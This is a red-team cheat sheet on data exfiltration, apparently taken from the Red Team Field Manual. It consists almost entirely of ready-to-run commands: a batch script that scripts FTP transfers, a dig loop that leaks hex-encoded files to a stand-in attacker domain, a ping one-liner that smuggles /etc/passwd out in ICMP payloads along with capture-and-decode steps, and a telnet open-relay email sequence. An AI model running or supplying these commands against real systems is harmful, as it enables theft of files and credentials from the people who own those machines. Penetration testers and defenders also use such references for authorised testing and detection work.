---
name: Data Exfiltration
category: Cheatsheets & Playbooks
description: Exfiltration techniques — FTP through non-interactive shells, DNS tunneling, ICMP exfil, open relay email.
tags: [exfiltration, dns, icmp, ftp, data-transfer, RTFM]
---

# Data Exfiltration

Techniques for exfiltrating data through various channels.

## FTP through non-interactive Windows shell

```batch
echo open <IP> 21 > ftp.txt
echo <USER> >> ftp.txt
echo <PASS> >> ftp.txt
echo bin >> ftp.txt
echo GET <FILE> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

## DNS exfiltration

```bash
# On victim: hex encode file
xxd -p secret > file.hex

# On victim: DNS lookup each line
for b in `cat file.hex`; do dig $b.shell.evilexample.com; done

# On attacker: capture DNS packets
tcpdump -w /tmp/dns -s0 port 53 and host system.example.com

# On attacker: extract hex from DNS
tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d' ' | cut -f1 -d'.' | uniq > received.txt

# Reverse hex encoding
xxd -r -p < received.txt > keys.pgp
```

## ICMP exfiltration

```bash
# On victim
stringZ=`cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n"`; counter=0; while (($counter <= ${#stringZ}));do ping -s 16 -c 1 -p ${stringZ:$counter:16} 192.168.10.10 && counter=$((counter+16));done

# On attacker (capture and parse)
tcpdump -ntvvSxs 0 'icmp[0]=8' > data.dmp
grep 0x0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
```

## Email from open relay (Telnet)

```
telnet <IP> 25
HELO
MAIL FROM:<EMAIL>
RCPT TO:<EMAIL>
DATA
Thank You.
.
quit
```

> Source: RTFM — Red Team Field Manual v2
